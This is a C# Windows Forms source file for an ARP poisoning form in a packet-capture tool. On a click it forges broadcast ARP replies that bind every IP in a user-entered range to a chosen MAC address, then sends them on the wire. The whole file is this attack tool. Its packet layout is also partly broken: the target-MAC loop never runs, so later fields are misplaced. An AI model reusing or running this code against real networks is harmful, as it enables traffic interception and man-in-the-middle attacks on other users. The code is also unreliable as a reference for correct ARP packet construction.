using IpRanges;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MyPacketCapturer
{
    public partial class frmARPPoison : Form
    {
        internal static int instantiation;

        public frmARPPoison()
        {
            InitializeComponent();
            instantiation++;
        }

        private void frmARPPoison_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            var MAC = txtMAC.Text;
            MAC = MAC.Replace(" ", String.Empty);
            MAC = MAC.Replace(":", String.Empty);
            //var ip = IPAddress.Parse(txtIP.Text);
            IPRange range = new IPRange(txtIP.Text);

            //get all the ips
            List<IPAddress> ips = range.GetAllIP();

            foreach (IPAddress ip in ips)
            {
                byte[] packet = new byte[42];

                //set to broadcast
                for (int i = 0; i < 6; i++)
                {
                    packet[i] = Convert.ToByte("ff", 16);
                }

                char[] cMac = MAC.ToCharArray();
                byte[] convertedMac = new byte[6];

                int g = 6;
                for (int i = 0; i < MAC.Count(); i ++)
                {
                    string t = cMac[i] + "" + cMac[i + 1];
                    packet[g] = Convert.ToByte(t, 16);
                    convertedMac[g-6] = packet[g];
                    t = convertedMac[g -6].ToString("X2");
                    i++;
                    g++;
                }
                packet[g++] = Convert.ToByte("08", 16);
                packet[g++] = Convert.ToByte("06", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("01", 16);
                packet[g++] = Convert.ToByte("08", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("06", 16);
                packet[g++] = Convert.ToByte("04", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("02", 16);

                //sender
                packet[g++] = convertedMac[0];
                packet[g++] = convertedMac[1];
                packet[g++] = convertedMac[2];
                packet[g++] = convertedMac[3];
                packet[g++] = convertedMac[4];
                packet[g++] = convertedMac[5];

                byte[] p = ip.GetAddressBytes();

                foreach (byte b in p)
                {
                    packet[g++] = b;
                }

                //target data000c29fbc547

                //set to broadcast
                for (;g < 6; g++)
                {
                    packet[g] = Convert.ToByte("ff", 16);
                }

                byte[] bytes = ip.GetAddressBytes();

                foreach (byte b in bytes)
                {
                    packet[g++] = b;
                }

                frmCapture.device.SendPacket(packet);
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        
        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
}
